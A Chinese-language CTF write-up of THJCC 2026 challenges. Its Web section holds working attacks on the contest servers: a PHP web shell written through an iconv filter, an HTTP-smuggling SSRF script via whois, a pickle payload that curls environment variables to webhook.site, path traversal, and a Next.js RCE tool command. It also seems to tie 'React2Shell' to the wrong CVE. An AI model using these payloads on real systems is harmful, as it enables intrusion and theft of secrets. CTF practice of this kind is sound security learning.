---
title: THJCC 2026 writeup
date: 2026-02-22
categories:
  - 競賽
  - CTF
tags:
  - writeup
  - note
  - CTF
  - web
photos:
  - /img/logo2.png
description: |-
  六十四座黃銅塔傾覆之夜 八十八個黎明醒轉之時
  以八分之一刃 刺穿十一翼的天使
  斬落第八道光
---

# 前言
這自跨年的Fh11401後我打的第二個 CTF，有了上次的經驗這次比賽就比較知道該用麼思路了來解題了，~~雖然還是很爛@@~~

![image](https://hackmd.io/_uploads/SkRvFyK_bl.png)
也是獲得學生賽區第8名
# Welcome
![image](https://hackmd.io/_uploads/BJxhU5bYZe.png)
裡面的字會亂飛
 ![image](https://hackmd.io/_uploads/HJufU5Wtbg.png)
~~當然是時機抓的對截圖就有了~~
![image](https://hackmd.io/_uploads/HkvyvcWK-l.png)
（反正我是開主控台來看啦XD

# Reverse
我真的是很不會逆向，只有一題因為flag寫得很明顯有解出來，理所當然
~~我也不會Pwn~~
XD
## Super baby reverse
給了一個名為`THJCC_Super_Baby_Reverse`的檔案
開IDA
在hex中看到flag
![image](https://hackmd.io/_uploads/Skl4jJYu-l.png)
去掉`H`的干擾
> flag：THJCC{BaBY_r3v3rs3_f0r_beggin3r}
---
# Misc
不得不說`binwalk`真的很好用
很多題目都用這個解
## IMAGE?
給了一個魔法阿嬤的圖
![image](https://hackmd.io/_uploads/SJxIxR1F_Wl.png)
問了AI了解了`binwalk`這個好用的工具
```bash
$ binwalk -e THJCC_IMAGE.png 

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
3297649       0x325171        Zip archive data, at least v1.0 to extract, name: cute/
3297712       0x3251B0        Zip archive data, at least v2.0 to extract, compressed size: 3295808, uncompressed size: 3297649, name: cute/F.png
6593588       0x649C34        Zip archive data, at least v2.0 to extract, compressed size: 2009795, uncompressed size: 2009485, name: cute/F3.png
```
裡面有一個`/cute`資料夾其中一張png就是flag
![image](https://hackmd.io/_uploads/HkiHyeYdWx.png)
> flag：THJCC{fRierEN-OS_cUTe:)}
## Provisioning in Progress
題目講了是要檢索名為AS201943的授權令牌
~fishbaby1011你會不會太酷了這邊給到頂級~
在NOC Portal (http://fishbaby1011.net/) 資訊中看到了資源配置表
題目講道NOC授權令牌被綁定在真正在路由表上活躍的網段之中
其為`2a14:7581:6fa0::/48`
使用WHOIS查詢
```bash
$ whois -h whois.ripe.net -B 2a14:7581:6fa0::/48
```
看到remarks為`v1.fWxhZXJfZXJhX3NleGlmZXJwX2RlY251b25uYV95bG5ve2Njamh0`
去掉`v1.`後解base64
```
}laer_era_sexiferp_decnuonna_ylno{ccjht
```
反轉後得可得
>flag：thjcc{only_announced_prefixes_are_real}
>~所以fishbaby1011為甚麼你的flag是小寫~
## Metro
給了一張捷運站內拍的圖需要找站名跟樓層
![image](https://hackmd.io/_uploads/Sk6oXxtu-g.png)
注意到途中有一小湖以及給我的感覺像是青埔南崁那邊
~~對我就是通靈王~~
沿著機捷看衛星地圖，看到鼻山站很符合要求
![image](https://hackmd.io/_uploads/S1noEeFuWe.png)

>flag：THJCC{A10-3F}
## 哦更愛你了
給了`.HEIC`的圖檔
圖像是燒肉
![image](https://hackmd.io/_uploads/ryNlLetdbl.png)
~~我好餓我也要吃~~
在經過一貫的測試後發現使用`binwalk`可以看到裡面有隱藏的檔案
```
$ binwalk -e challenge.HEIC             

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------

WARNING: Extractor.execute failed to run external extractor 'jar xvf '%e'': [Errno 2] No such file or directory: 'jar', 'jar xvf '%e'' might not be installed correctly
2572595       0x274133        Zip archive data, encrypted at least v1.0 to extract, compressed size: 27, uncompressed size: 15, name: flag.txt
```
名為`2572595.zip`的檔案其中有`flag.txt`
![image](https://hackmd.io/_uploads/B1_nOeFdWe.png)
需要輸入密碼
根據提示`在這特別的日子裡，送給你們一首非常特別的歌曲，特別的八字給特別的你（忽略標點符號）`以及題目的圖片推斷密碼為`19190810`或`11451419`
![image](https://hackmd.io/_uploads/Hk9Hcxt_-e.png)
~~竟然不對這不合理!!!!~~
根據`特別的八字`推斷密碼是8個位元
使用`fcrackzip`爆破
```bash
fcrackzip -b -c 1 -l 8-8 -u _challenge.HEIC.extracted
```
得到密碼`30000810`
>flag：THJCC{Y@JUNlKU}

~所以為甚麼不是11451419，我要申訴(⁠ノ⁠｀⁠Д⁠´⁠)⁠ノ⁠~
# Forensics 
## I use arch btw
![image](https://hackmd.io/_uploads/rkzn3etuWe.png)

按照題目敘述應該也是檔案被隱藏在其中
使用`binwalk`
```bash
$ binwalk -e THJCC_I_use_arch_btw.jpg 

DECIMAL       HEXADECIMAL     DESCRIPTION
--------------------------------------------------------------------------------
76507         0x12ADB         Zip archive data, at least v2.0 to extract, compressed size: 6284, uncompressed size: 9216, name: readme.xlsx
```
給了兩個`redme.xlsx`其中一在`12ADB.zip`且皆有密碼保護
使用線上的工具破解檔案
破解後得到
![image](https://hackmd.io/_uploads/rJNg1-KOWl.png)

>flag：THJCC{7h15_15_7h3_m3554g3....._1_u53_4rch_b7w}

## TV
提供了一個`.flac`音檔
按照題目名稱推斷有可能是**SSTV**，是過去業餘無線電愛好者的一種圖片傳輸方法
使用QSSTV監聽音訊
![螢幕擷取畫面 2026-02-22 200632](https://hackmd.io/_uploads/ry6FxbKuZg.png)

不太會用只會開自動檔
所以很容易中斷擷取到部分不完整
但已足夠推斷



>flag：THJCC{sSTv-is_aMaZINg}
## ExBaby Shark Master
題目給了一pcapng封包檔
![image](https://hackmd.io/_uploads/Bk2-Q-YuZe.png)
嘗試篩選THJCC沒想到真的成功了
![image](https://hackmd.io/_uploads/rkCH7ZtdWx.png)

其明文就是flag
>THJCC{1t'S-3Asy*-r1gh7?????}

~~我根本通靈王有人要跟我組金盾嗎~~
# Web
這邊給到夯
解最多的題目就是web，真的很適合給新手打（我就是
## Las Vegas
一個拉霸機 按pull後會請求`/n=三位數`的封包
![image](https://hackmd.io/_uploads/rkQa7btubl.png)

題目內文說了**Lucky 7 7 7**
使用Burp Suitre修改請求的封包
![image](https://hackmd.io/_uploads/HJ-DBWKdZe.png)




>flag：THJCC{LUcKy_sEVen_9111e6058407f339}

## Ear
題目說明這是**CWE-698**漏洞，向客戶端發送了重定向指令，但並未终止原始頁面後續代碼的執行
嘗試 admin.php這個常見的後台管理頁面

```
$ curl -i http://chal.thjcc.org:1234/admin.php
HTTP/1.1 302 Found
Date: Sun, 22 Feb 2026 22:45:23 GMT
Server: Apache/2.4.66 (Debian)
X-Powered-By: PHP/8.5.3
Set-Cookie: PHPSESSID=e7becd48283171190c25e91dceb1f3ff; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Location: index.php
Content-Length: 247
Content-Type: text/html; charset=UTF-8

<!doctype html>
<html>
<head><meta charset="utf-8"><title>Admin Panel</title></head>
<body>
<p>Admin Panel</p>
<p><a href="status.php">Status page</a></p>
<p><a href="image.php">Image</a></p>
<p><a href="system.php">Setting</a></p>
</body>
</html>                     
```
請求`system.php`


```
HTTP/1.1 302 Found
Date: Sun, 22 Feb 2026 22:46:19 GMT
Server: Apache/2.4.66 (Debian)
X-Powered-By: PHP/8.5.3
Set-Cookie: PHPSESSID=ea3569cd766263de18c0d6498665f634; path=/
Expires: Thu, 19 Nov 1981 08:52:00 GMT
Cache-Control: no-store, no-cache, must-revalidate
Pragma: no-cache
Location: index.php
Content-Length: 184
Content-Type: text/html; charset=UTF-8

<!doctype html>
<html>
<head><meta charset="utf-8"><title>Admin Panel</title></head>
<body>
<p>System settings</p>
<p>THJCC{f00c263454c4da44_U_kNoW-HOw-t0_uSe-EaR}</p>
</body>
</html>
```
>flag：THJCC{f00c263454c4da44_U_kNoW-HOw-t0_uSe-EaR}
## My First React
們發現了兩個關鍵的 React 元件：
登入介面：
在程式碼中可以看到註解字串 `* try guest / guest`。如果我們在網頁上輸入帳號 `guest`、密碼 `guest`，會成功登入並進入下一個畫面，但只會看到一行普通的問候語，拿不到 Flag

繼續往下看，會發現登入後渲染的元件有一段特別的邏輯檢查：

```JavaScript
if (e === "admin") {
    let e = Math.floor(Date.now() / 1e4);
    const n = await async function(e){
        // ... (省略) ...
        r = await crypto.subtle.digest("SHA-1", n);
        return Array.from(new Uint8Array(r)).map(e=>e.toString(16).padStart(2,"0")).join("")
    }(""+e);
    const r = await fetch(n);
    const a = (await r.json()).result;
    o(a); // 將結果顯示在畫面上
}
```


取得當前的時間戳ms除以10000並無條件捨去
將這個數字字串進行 SHA-1 雜湊計算
將計算出來的 Hash 字母直接當作 URL 路徑（例如 /<hash>）發起 fetch 請求
伺服器驗證該 Hash 若符合當下時間就會回傳包含 Flag 的 JSON 資料
    
payload
```s
(async function() {
    let e = Math.floor(Date.now() / 1e4);
    const n = await async function(e){
        const n = (new TextEncoder).encode(e),
        r = await crypto.subtle.digest("SHA-1", n);
        return Array.from(new Uint8Array(r)).map(e=>e.toString(16).padStart(2,"0")).join("")
    }(""+e);
    
    console.log("嘗試獲取 URL: /" + n);
    let r = await fetch(n);
    
    if (r.ok) {
        const data = await r.json();
        console.log("Flag 是：", data.result || data);
    } else {
        console.error("狀態碼：", r.status);
    }
})();
```
>flag：THJCC{CSR_c4n_b3_d4ng3rrr0us!}
    
## A long time ago...
題的核心是利用 PHP 老版本的 Type Juggling（弱型別比較） 漏洞
    ![image](https://hackmd.io/_uploads/B1brkMFu-g.png)
輸入0即可得flag
    ![image](https://hackmd.io/_uploads/SkxdJfYuWe.png)
>flag：THJCC{Meow_M3ow_Me0w}
    
## Secret File Viewer
![image](https://hackmd.io/_uploads/SJZ3nfFdWg.png)
點擊後會下載`A.txt`、`B.txt`、`C.txt`
檔案C有重要提示
![image](https://hackmd.io/_uploads/SyS7pftuWe.png)
按鈕的功能是對`download.php?file=`做請求
![image](https://hackmd.io/_uploads/rkL4azKubl.png)
改為`download.php?file=/flag.txt`
>flag：THJCC{h0w_dID_y0u_br34k_q'5_pr073c710n???}
## No Way Out
本題須繞過`exit()`且在檔案被背景腳本刪除的 0.67 秒內利用未被封鎖的 `iconv` 濾鏡破壞 `exit()` 語法結構，完成**Web Shell**的寫入與執行。

原始碼 (index.php)
```PHP
<?php
    error_reporting(0);
    $content = $_POST['content'];
    $file = $_GET['file'];

    if (isset($file) && isset($content)) {
        
        $exit = '<?php exit(); ?>';
        $blacklist = ['base64', 'rot13', 'string.strip_tags'];

        foreach($blacklist as $b){
            if(stripos($file, $b) !== false){
                die('Hacker!!!');
            }
        }

        file_put_contents($file, $exit . $content);
	
	usleep(50000);

        echo 'file written: ' . $file;
    }

    highlight_file(__FILE__);
?>
```
    
    
繞過黑名單b等常見濾鏡被擋
    改用 `php://filter/convert.iconv.UCS-2LE.UCS-2BE` 
將目標後門 `<?php system($_GET[1]); ?>` 預先手動對調為 `?<hp pystsme$(G_TE1[)] ;>?`
寫入時經過伺服器濾鏡再次對調，完美還原為有效程式碼
利用`while`迴圈，在檔案被刪除的 0.67 秒極短空檔內，不斷發動寫入與讀取請求來進行碰撞
```
while true; do
  curl -s -X POST 'http://chal.thjcc.org:8080/index.php?file=php://filter/convert.iconv.UCS-2LE.UCS-2BE/resource=shell.php' \
  --data 'content=?<hp pystsme$(G_TE1[)] ;>?' > /dev/null
done
```
另一視窗
```
while true; do
  curl -s 'http://chal.thjcc.org:8080/shell.php?1=cat%20/flag.txt' | grep -o 'THJCC{.*}' && break
done
```
## who is whois
分析原始碼還原被 Base64 與 XOR 混淆的 TOTP Secret，計算出動態密碼
利用 shlex.split() 的特性，傳遞 -h (指定 Host) 與 -p (指定 Port) 參數給系統的 whois 指令
藉由 whois 指令發送純文字的特性，精心構造包含 \r\n 的字串，偽造出一個標準的 HTTP POST 請求，藉此繞過 /flag 路由的 127.0.0.1 來源限制
    
exploit:
```python=
Python
import requests
import pyotp
import base64

TARGET_URL = "http://chal.thjcc.org:13316/whois"

# 1. 解密 Secret 並獲取當前 TOTP
raw = base64.b64decode("Jl5cLlcsI10sKCYhLS40IykpMyQnIF8wIjEtPTM6OzI=")
secret = "".join(chr(b ^ ord("thjcc"[i % 5])) for i, b in enumerate(raw))
current_code = pyotp.TOTP(secret).now()

# 2. 構造要走私的 HTTP POST Payload
# 利用 whois -h 127.0.0.1 -p 13316 將以下字串打向本地的 /flag
payload = (
    f'-h 127.0.0.1 -p 13316 "POST /flag HTTP/1.1\r\n'
    f'Host: 127.0.0.1\r\n'
    f'admin: thjcc\r\n'
    f'Content-Type: application/x-www-form-urlencoded\r\n'
    f'Content-Length: 14\r\n\r\n'
    f'safekey={current_code}"'
)

# 3. 發送攻擊請求
r = requests.post(TARGET_URL, data={"domain": payload})
print(r.text) # 在回傳的 HTML 中即可找到 THJCC{...}
```
## 0422
正常登入後發現`cookie`
![image](https://hackmd.io/_uploads/SJ2l0EKu-e.png)
將`role`改為`admin`
>flag：THJCC{c00k135_4r3_n07_53cur3_1f_n07_51gn3d_4nd_p13453_d0_7h3_53cur3_c0d1ng_r3v13w_101111}

## msgboard
根據原始檔`flag`藏在環境變數裡
發現 `/api/v1/send_email_code` 的回應裡**直接把驗證碼明文回傳**，不用真的收信就能拿到驗證碼，直接註冊帳號。
看源碼發現 `upload_image` 有兩個 bug 疊在一起
`secure_filename(filename)` 有呼叫，但**回傳值被丟掉**，完全沒效果
副檔名黑名單的 config key 寫 `DISALLOWED_EXTENSION`，但讀取時用 `DISALLOWED_EXTENSIONS`（多一個 S），永遠讀到 `None`，**黑名單完全失效**

結果就是可以上傳任意副檔名、任意內容的檔案
存檔時用的是
```python
file.save(os.path.join(UPLOAD_FOLDER, filename))
```
Python 的 `os.path.join` 遇到**絕對路徑會直接覆蓋前面的路徑**，所以把 filename 設成 `/python-docker/spam_classifier.joblib` 就能把檔案寫到任意位置。
源碼裡的 `check_for_spam()` 每次發留言都會執行：
```python
model = joblib.load("spam_classifier.joblib")  # 每次都重新 load！
```
`joblib.load`本質上是 pickle，**pickle 反序列化時可以執行任意程式碼**。只要覆蓋這個檔案，下一次有人發留言就會觸發 RCE

製作exploit：
```python
class Exploit(object):
    def __reduce__(self):
        cmd = "curl 'https://webhook.site/...?x='\"$(env | base64)\"''"
        return (os.system, (cmd,))

payload = pickle.dumps(Exploit())
```
上傳覆蓋`spam_classifier.joblib`，然後自己發一篇留言觸發，環境變數就被 curl 出來了
Webhook 收到 `base64`

>flag:THJCC{model2rce456ytrrghdrydhrth}
## noaiiiiiiiiiiiiiii
在`robots.txt`中看到隱藏路徑
![image](https://hackmd.io/_uploads/rJ8dKit_Zg.png)
給予的是該題目的原始檔

![image](https://hackmd.io/_uploads/S1y5YoFOWg.png)

下載後發現這是這個是這個 **CVE-2017-14849** 漏洞
`Node.js 8.5.0` 對目錄進行 `normalize` 操作時，出現了邏輯錯誤。
當我們在向上層跳躍的路徑中，如果刻意在中間位置增加一個無意義的目錄切換，就會觸發這個 Bug
給予的原始檔描述了`/flag_F7aQ9L2mX8RkC4ZP`
也就是`flag`可能會出現在根節點

payload
```
curl --path-as-is http://chal.thjcc.org:3001/static/../../../a/../../../../flag_F7aQ9L2mX8RkC4ZP
```
不能直接把這段 URL 貼到瀏覽器的網址列
因為所有現代瀏覽器在送出請求前，都會在本地端先自動把 `../` 解析並抵銷掉
>flag：THJCC{y0u_mu57_b3_4_r34l_hum4n_b3c4u53_0nly_4_hum4n_c4n_r34d_4nd_und3r574nd_7h15_fl46_c0rr3c7ly}
## r2s
作者又提到「懶得更新伺服器」，這通常暗示該伺服器正運行著一個有知名漏洞的舊版本
    ![image](https://hackmd.io/_uploads/HkC0W3Yu-e.png)

注意到其Next.js版本為15.0.0
這給人的感覺就很刻意
查詢後發現有一通稱為`React2Shell`的漏洞(CVE-2025-29927)
在15.0.0<=Next.js版本< 15.2.3
使用github上名為[NextRce](https://github.com/ynsmroztas/NextRce?tab=readme-ov-file)的漏洞利用腳本
~~方便~~
```
$ python3 NextRCSWaff.py -u http://chal.thjcc.org:10458/ -c "ls -al /" --bypass
```
![螢幕擷取畫面 2026-02-23 183802](https://hackmd.io/_uploads/ryRBm3KuZx.png)
>flag：THJCC{r34ct_ssr_rc3_1s_d4ng3r0us}

# AI
我先說
~~我覺得這是裡面極度通靈的題目~~
## Deep Inverse
為了解決這個問題，需要反轉 `model.pt` 中的神經網路模型
找到一個 10 維輸入向量 `x` ，使得模型的輸出 `f(x)` 約為 `1337.0`
這通常是透過將其視為最佳化問題來實現的
使用輸入 x 上的梯度下降法來最小化模型預測值與目標值之間的損失

pwn模組的功能也可以加進去~~我懶~~
```python=
from pwn import *
import torch
import torch.optim as optim
import numpy as np

# ==================== 本地優化部分 ====================
# 載入 TorchScript 模型
model = torch.jit.load('model.pt', map_location='cpu')
model.eval()

target = 1337.0

def optimize_x(start_scale=1.0, use_lbfgs=True, max_iters=30000, loss_type='L2'):
    # 正確初始化：保持 leaf Tensor
    x = torch.randn(1, 10, requires_grad=True)
    if start_scale != 1.0:
        x.data.mul_(start_scale)               # inplace scale，保留 leaf 屬性

    if use_lbfgs:
        optimizer = optim.LBFGS(
            [x],
            lr=0.8,
            max_iter=50,
            history_size=200,
            line_search_fn='strong_wolfe'
        )
    else:
        optimizer = optim.Adam([x], lr=0.1)

    best_loss = float('inf')
    best_output = None
    best_x = None

    print(f"開始優化 (scale={start_scale}, optimizer={'LBFGS' if use_lbfgs else 'Adam'}, loss={loss_type})...")

    for i in range(max_iters):
        def closure():
            optimizer.zero_grad()
            out = model(x).squeeze()
            if loss_type == 'L2':
                loss = (out - target) ** 2
            else:
                loss = torch.abs(out - target)
            loss.backward()
            return loss

        current_loss = closure().item()

        if current_loss < best_loss:
            best_loss = current_loss
            best_output = model(x).squeeze().item()
            best_x = x.detach().clone()
            print(f"[改善] iter {i:5d} | loss {best_loss:12.6f} | output {best_output:12.6f}")

        optimizer.step(closure)

        if i % 2000 == 0:
            print(f"iter {i:5d} | loss {current_loss:12.6f} | output {model(x).squeeze().item():12.6f}")

        if current_loss < 1e-5:
            print("已收斂!")
            break

    return best_x, best_loss, best_output
# 試多種設定找出最佳
configs = [
    {'start_scale': 1.0, 'use_lbfgs': True, 'loss_type': 'L2'},
    {'start_scale': 10.0, 'use_lbfgs': True, 'loss_type': 'L2'},
    {'start_scale': 50.0, 'use_lbfgs': True, 'loss_type': 'L2'},
    {'start_scale': 100.0, 'use_lbfgs': True, 'loss_type': 'L2'},
    {'start_scale': 10.0, 'use_lbfgs': False, 'loss_type': 'L1'},
    {'start_scale': 50.0, 'use_lbfgs': False, 'loss_type': 'L1'},
]

best_overall_loss = float('inf')
best_overall_x = None
best_overall_output = None

for config in configs:
    curr_x, curr_loss, curr_output = optimize_x(**config)
    if curr_loss < best_overall_loss:
        best_overall_loss = curr_loss
        best_overall_x = curr_x
        best_overall_output = curr_output
    print(f"此設定結束: loss {curr_loss:.10f}, output {curr_output:.6f}\n")

if best_overall_x is None:
    print("所有設定都失敗，請試更大 scale 或更多 iter")
    exit(1)

# 準備 payload
payload = ','.join(f"{v:.10f}" for v in best_overall_x.view(-1).tolist())
print(f"\n最終最佳 x: {payload}")
print(f"本地預期輸出: {best_overall_output:.6f} (loss: {best_overall_loss:.10f})")

# ==================== 連線部分 ====================
r = remote('chal.thjcc.org', 1337)

r.recvuntil(b'> ')

print("\n送出...")
r.sendline(payload.encode())

response = r.recvall(timeout=5).decode(errors='ignore')
print("\nServer 回應:")
print(response)

r.close()
```
                                
>flag：THJCC{Stoc4st1c_W3ight_D3sc3nt_M4st3r_xedrftginjk54896ghjbijkml52563201}
    
## NEURAL_OVERRIDE
![image](https://hackmd.io/_uploads/Sk9RBhF_Ze.png)
題目有伊綱诶
超喜歡
![螢幕擷取畫面 2026-02-21 173458](https://hackmd.io/_uploads/ByOVJ6FObg.png)
這題我也不知道發生什麼事
丟了一個他提供的`.pt`檔我就過了
然後現在過不了也不知道怎麼解釋的XD
>flag：THJCC{y0ur_ar3_the_adv3rs3r1al_attack_m0st3r}
# Crypto
## 676767
six seven~

`random.seed(x)` 在處理整數 `x` 時，底層實作會自動取絕對值 `abs(x)`
利用題目限制了 `a = 0` 或 `a = 1` 會直接退出程式
輸入 `a = -1` 且 `b = 0`，使得 `a*seed + b` 的計算結果為 `-seed`。透過絕對值轉換
`random.seed(-seed`) 的狀態會完美還原成初始的 `random.seed(seed)`
程式開頭洩漏的 10 個數字是使用 `random.getrandbits(256)` 產生的
但在後續的驗證階段，使用的是 `random.randrange(base`)
題目的 `base` 是一個略小於 $2^{256}$ 的大整數
    當 Python 執行 `randrange(base)` 時，會先呼叫 `getrandbits(256)`
若抽出的數字 $\ge base$，就會觸發拒絕採樣並重新抽樣。這個隱含的重新抽樣會額外消耗 PRNG 的內部狀態，導致我們預測的序列與伺服器發生錯位驗證失敗
寫腳本不斷重新連線（刷首抽），直到伺服器洩漏的 10 個數字全部都 $< base$。在這種完美開局下，`randrange(base)` 絕對不會觸發重新抽樣，我們即可將這 10 個數字原封不動送回，順利通過驗證
```python=
from pwn import *

# 題目設定的 base 值
base = 86844066927987146567678238756515930889952488499230423029593188005934867676767

# 關閉 pwntools 預設的連線開關提示，讓終端機畫面乾淨一點
context.log_level = 'error'

def solve():
    attempts = 0
    print("[*] 開始暴力刷首抽尋找幸運數列...")
    
    while True:
        attempts += 1
        try:
            # 連線到題目伺服器
            r = remote('chal.thjcc.org', 48764)
            
            vals = []
            # 讀取並解析前 10 個數字
            for _ in range(10):
                line = r.recvline().decode().strip()
                val = int(line.replace('< ', ''))
                vals.append(val)
            
            # 檢查這 10 個數字是否「全部」都小於 base
            if all(v < base for v in vals):
                print(f"[+] 在第 {attempts} 次連線時找到幸運數列！開始進行攻擊...")
                
                # 繞過 random.seed() 的保護機制 (利用取絕對值的特性)
                r.sendlineafter(b"a>", b"-1")
                r.sendlineafter(b"b>", b"0")
                
                # 將這 10 個幸運數字照順序送回去
                for v in vals:
                    r.sendlineafter(b"> ", str(v).encode())
                
                # 接收最後的 Flag
                print("[+] 成功！伺服器回應：")
                print(r.recvall().decode())
                break
            else:
                # 運氣不好，裡面有大於或等於 base 的數字，直接斷線重來
                r.close()
                if attempts % 10 == 0:
                    print(f"[*] 已經嘗試了 {attempts} 次，繼續尋找中...")
                    
        except EOFError:
            # 處理伺服器意外斷線的狀況
            r.close()

if __name__ == '__main__':
    solve()
```